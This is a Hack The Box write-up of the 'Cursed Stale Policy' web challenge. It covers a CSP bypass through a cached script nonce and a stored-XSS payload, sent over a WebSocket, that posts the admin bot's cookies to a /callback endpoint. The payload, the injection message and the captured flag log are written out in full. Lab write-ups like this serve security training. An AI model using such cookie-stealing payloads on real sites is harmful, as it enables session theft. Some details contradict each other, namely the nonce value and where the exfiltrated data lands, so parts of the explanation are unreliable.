---
clayout: ctf
title: Cursed Stale Policy
date: 2024-12-27
image: /icon/hack-the-box/web.svg
type: Hack The Box

ctf:
    - name: Cursed Stale Policy
      link: https://app.hackthebox.com/challenges/811
      thumbnail: /ctf/hack-the-box/challenges/web/cursed-stale-policy/thumbnail.gif
      pwned:
        - link: https://www.hackthebox.com/achievement/challenge/585215/811
          thumbnail: /ctf/hack-the-box/challenges/web/cursed-stale-policy/pwned.png
---

## Challenge Description

Spying time. Check what all users have been up to with this Challenge recently.

## Challenge Overview

In this web challenge, the web application includes functionality that leverages user-provided inputs and interacts with
a bot to validate and process specific behaviors. Upon navigating the application, we observe a page with the ability to
send inputs that are reflected within the application context. Additionally, a Content Security Policy (CSP) header is
enforced to prevent certain classes of script-based attacks.

A notable endpoint is `/ws`, which serves as a WebSocket interface for interacting with the server. The server's
functionality hints at integration with a bot that periodically processes inputs, such as scripts embedded within the
application.

![Cursed Stale Policy - Overview](/ctf/hack-the-box/challenges/web/cursed-stale-policy/overview.png)

## Code Review

Upon reviewing the source code, we identify several crucial components:

### Content Security Policy (CSP)

```js
export async function getCachedCSP() {
    let cachedCSP = await redis.get("cachedCSPHeader");

    if (cachedCSP) {
        return cachedCSP; // TOOD: Should we cache the CSP header?
    } else {
        const nonce = crypto.randomBytes(16).toString("hex");
        const cspWithNonce = `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; base-uri 'none'; report-uri /csp-report`;

        await redis.set("cachedCSPHeader", cspWithNonce);

        return cspWithNonce;
    }
}
```

In the above code we see this line:

```js
const nonce = crypto.randomBytes(16).toString("hex");
```

Who generates a random nonce for the first time and caches it in the Redis database. This nonce is then used in the CSP
header to allow only scripts with the matching attribute to execute.

The generate `nonce` value is given in the index page as shown below:

![Cursed Stale Policy - nonce](/ctf/hack-the-box/challenges/web/cursed-stale-policy/nonce.png)

### WebSocket Functionality

The WebSocket handler (`websocket.js`) allows sending structured messages. Of particular interest is the `trigger_xss`
message type, which adds user-provided payloads to a queue for subsequent execution by the bot. This mechanism is
designed to evaluate scripts and validate specific functionality.

### Bot Behavior

The bot (`bot.js`) operates as follows:

1. Visits the `/xss` endpoint to execute XSS payloads fetched from Redis.
2. Includes a cookie containing the contents of `flag.txt` as a `flag` value when executing scripts.
3. Executes the provided payload, enabling potential exfiltration of sensitive data.

These components reveal that while CSP is designed to mitigate XSS attacks, the presence of the `trigger_xss` queue
creates an opportunity to exploit a stored XSS vulnerability if a valid payload adheres to CSP constraints.

## Exploitation

### Objective

Leverage the bot's behavior to retrieve the contents of `flag.txt` by bypassing the CSP.

### CSP Constraints Analysis

The CSP header requires all scripts to include a `nonce` attribute with the value `rAnd0m123` to execute. This
constraint prevents traditional inline script-based attacks but still allows exploitation if the `nonce` is included in
the payload.

### Exploitation Steps

#### Step 1: Crafting the Payload

**Payload:**

```html

<script nonce='rAnd0m123'>
    fetch('/callback', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookies: document.cookie })
    });
</script>
```

This payload who be executed by the bot and send the cookies to the `/callback` endpoint. The `nonce` attribute is
included to bypass the CSP constraints.

#### Step 2: Injecting the Payload

To inject the payload, send the following WebSocket message to the `/ws` endpoint:

```json
{
    "type": "trigger_xss",
    "payload": "<script nonce='rAnd0m123'>fetch('/callback', {method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookies: document.cookie })});</script>"
}
```

Using **Burp Suite Repeater**, send this payload to the WebSocket endpoint. This message queues the payload for the bot
to execute.

#### Step 3: Observing the Results

Once the payload is executed by the bot, the flag will be sent to the WebHook URL specified in the payload.

Example response in the WebHook site:

```json
{
    "type": "update_logs",
    "payload": [
        {
            "method": "POST",
            "headers": {
                "host": "127.0.0.1:8000",
                "connection": "keep-alive",
                "content-length": "101",
                "user-agent": "HackTheBoo/20.24 (Cursed; StalePolicy) CSPloitCrawler/1.1",
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "http://127.0.0.1:8000",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "http://127.0.0.1:8000/xss",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "cookie": "flag=HTB{f4k3_fl4g_f0r_t35t1ng}"
            },
            "args": {},
            "data": {
                "flag": "{\"message\":\"Route GET:/flag.txt not found\",\"error\":\"Not Found\",\"statusCode\":404}"
            },
            "time": "2024-12-26T18:15:15.459Z"
        }
    ]
}
```

We successfully retrieved the fake flag:

```
HTB{f4k3_fl4g_f0r_t35t1ng}
```

We can now use the same technique to get the real flag.

## Reference

- [Content Security Policy (CSP) Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Puppeteer Documentation](https://pptr.dev/)
- [WebSocket Basics](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API)
- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

![Cursed Stale Policy - favicon](/ctf/hack-the-box/challenges/web/cursed-stale-policy/favicon.png){style="width: 250px; height: 250px; display: block; margin: 0 auto;"} 
